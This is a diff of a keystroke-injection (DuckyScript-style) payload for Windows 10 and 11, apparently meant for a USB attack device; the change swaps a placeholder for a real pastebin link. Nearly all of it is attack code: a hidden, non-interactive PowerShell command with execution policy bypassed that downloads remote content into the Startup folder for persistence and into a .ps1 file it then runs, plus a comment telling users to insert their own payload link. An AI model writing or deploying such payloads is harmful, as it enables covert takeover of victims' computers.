@@ -9,7 +9,7 @@ REM     Target: Windows 10, 11
 DELAY 2000
 GUI
 DELAY
-STRING powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://pastebin.com/KbjVE507).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1"" 
+STRING powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://pastebin.com/KbjVE507).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr https://pastebin.com/A0baMQg5).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1"" 
 ENTER
 
 REM     Remember to replace the link with your pastebin shared link for the intended files to download
